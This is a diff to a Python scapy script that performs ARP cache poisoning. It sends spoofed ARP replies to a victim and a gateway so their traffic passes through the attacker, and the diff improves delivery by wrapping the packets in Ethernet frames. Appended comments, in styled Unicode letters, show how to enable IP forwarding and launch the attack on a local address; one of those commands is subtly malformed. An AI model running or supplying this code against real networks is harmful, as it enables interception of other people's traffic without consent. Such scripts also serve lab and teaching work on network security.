@@ -11,7 +11,7 @@ import os
 import sys
 import time
 from multiprocessing import Process
-from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
+from scapy.all import (ARP, Ether, conf, get_if_hwaddr, sendp, sniff, sndrcv, srp, wrpcap)
 
 def get_mac(targetship):
     packet = Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetship)
@@ -79,8 +79,8 @@ class Arper:
             sys.stdout.flush()
             
             try:
-                send(poison_victim)
-                send(poison_gateway)
+                sendp(Ether(dst=self.victimMac)/poison_victim)
+                sendp(Ether(dst=self.gatewayMac)/poison_gateway)
             except KeyboardInterrupt: # end the loop (ie the attack) by restoring the arp cache state
                 self.restore()
                 sys.exit()
@@ -100,14 +100,14 @@ class Arper:
        
     def restore(self):
         print('Restoring ARP tables...')
-        send( ARP(
+        sendp(Ether(dst=self.victimMac)/ARP(
             op = 2,
             psrc = self.gateway,
             hwsrc = self.gatewayMac,
             pdst = self.victim,
             hwdst = 'ff:ff:ff:ff:ff:ff'),
             count = 5)
-        send(ARP(
+        sendp(Ether(dst=self.gatewayMac)/ARP(
             op = 2,
             psrc = self.victim,
             hwsrc = self.victimMac,
@@ -119,3 +119,9 @@ if __name__ == '__main__':
     (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
     arpoon = Arper(victim, gateway, interface)
     arpoon.run()
+    
+# 𝗧𝗲𝘀𝘁:
+
+# 𝘦𝘤𝘩𝘰 1 > /𝘱𝘳𝘰𝘤/𝘴𝘺𝘴/𝘯𝘦𝘵/𝘪𝘱𝘷4/𝘪𝘱_𝘧𝘰𝘳𝘸𝘢𝘳𝘥 <letting the host know that we can forward packages>
+# 𝘴𝘶𝘥𝘰 𝘴𝘺𝘴 -𝘸 𝘯𝘦𝘵.𝘪𝘯𝘦𝘵.𝘪𝘱.𝘧𝘰𝘳𝘸𝘢𝘳𝘥𝘪𝘯𝘨=1
+# sudo python arper.py 10.0.2.15 10.0.2.1 eth0
